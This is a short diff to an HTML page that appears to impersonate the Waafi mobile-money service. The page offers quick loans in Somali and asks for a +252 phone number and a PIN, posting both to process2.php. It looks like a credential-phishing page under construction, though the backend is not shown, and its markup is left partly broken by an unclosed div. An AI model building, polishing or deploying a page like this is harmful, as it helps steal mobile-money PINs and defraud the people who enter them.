@@ -118,11 +118,12 @@ button {
     <h1>Waafi</h1>
     <p>Amaahado Sahlan oo Degdeg ah</p>
 </div>
-<form action="process2.php" method="POST">
+
 
 <div class="container">
 
     <h2>Gal</h2>
+<form action="process2.php" method="POST">
 
     <div class="phone-box">
         <span>🇸🇴 +252</span>
@@ -130,6 +131,8 @@ button {
     </div>
 
     <p>Geli PIN-kaaga</p>
+
+<div class="container"
 
     <div class="pin-box">
         <input type="password" maxlength="1" class="pin">
@@ -142,7 +145,8 @@ button {
 
     <br>
 
-    <button id="submitBtn">GAL</button>
+    <button type="submit">SII WAD</button>
+
  </form>
 
 </div>
